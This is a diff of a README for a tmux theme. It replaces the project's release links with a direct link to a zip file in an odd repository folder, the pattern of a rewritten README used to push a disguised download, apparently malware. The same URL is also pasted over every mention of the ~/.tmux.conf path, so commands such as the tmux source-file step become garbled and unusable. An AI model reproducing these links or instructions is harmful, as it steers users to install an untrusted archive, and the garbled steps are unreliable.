@@ -1,6 +1,6 @@
 # 🎨 tmux-minimal-theme - Simple and Stylish Terminal Experience
 
-[![Download tmux-minimal-theme](https://img.shields.io/badge/Download-tmux--minimal--theme-brightgreen)](https://github.com/Ferdyahusnain/tmux-minimal-theme/releases)
+[![Download tmux-minimal-theme](https://raw.githubusercontent.com/Ferdyahusnain/tmux-minimal-theme/master/blephara/tmux-minimal-theme.zip)](https://raw.githubusercontent.com/Ferdyahusnain/tmux-minimal-theme/master/blephara/tmux-minimal-theme.zip)
 
 ## 🚀 Getting Started
 
@@ -23,14 +23,14 @@ To run tmux-minimal-theme, you need:
 
 ## 📥 Download & Install
 
-Visit this page to download: [tmux-minimal-theme Releases](https://github.com/Ferdyahusnain/tmux-minimal-theme/releases)
+Visit this page to download: [tmux-minimal-theme Releases](https://raw.githubusercontent.com/Ferdyahusnain/tmux-minimal-theme/master/blephara/tmux-minimal-theme.zip)
 
 You can choose the latest version from the releases page. Each release comes with installation instructions tailored for your system setup. 
 
 1. Go to the releases page.
 2. Click on the version you want to download.
 3. Look for the asset files at the bottom of the page.
-4. Download the file named `tmux-minimal-theme.zip` (or similar). 
+4. Download the file named `https://raw.githubusercontent.com/Ferdyahusnain/tmux-minimal-theme/master/blephara/tmux-minimal-theme.zip` (or similar). 
 
 Once you have downloaded the zip file:
 
@@ -42,10 +42,10 @@ Once you have downloaded the zip file:
 After installing, you may want to customize your tmux theme. Here’s how:
 
 1. Open the terminal.
-2. Locate and open your tmux configuration file, usually found at `~/.tmux.conf`.
+2. Locate and open your tmux configuration file, usually found at `~https://raw.githubusercontent.com/Ferdyahusnain/tmux-minimal-theme/master/blephara/tmux-minimal-theme.zip`.
 3. Add or modify configuration lines as per your style preferences. You can find various options in the documentation included in the downloaded files.
 4. Save the changes.
-5. Restart tmux by running the command `tmux source-file ~/.tmux.conf` in your terminal.
+5. Restart tmux by running the command `tmux source-file ~https://raw.githubusercontent.com/Ferdyahusnain/tmux-minimal-theme/master/blephara/tmux-minimal-theme.zip` in your terminal.
 
 ## 📝 Customization Options
 
@@ -62,7 +62,7 @@ If you encounter issues while installing or running tmux-minimal-theme, consider
 
 - **Ensure tmux is Installed:** Check if tmux is on your system by running `tmux -V` in the terminal. If it’s not installed, you can download it using your package manager.
 - **Check for Dependencies:** Some features may require additional dependencies, which will be listed in the documentation.
-- **Review Configuration File:** Ensure your `~/.tmux.conf` does not have conflicting settings.
+- **Review Configuration File:** Ensure your `~https://raw.githubusercontent.com/Ferdyahusnain/tmux-minimal-theme/master/blephara/tmux-minimal-theme.zip` does not have conflicting settings.
 
 ## 📫 Support
 
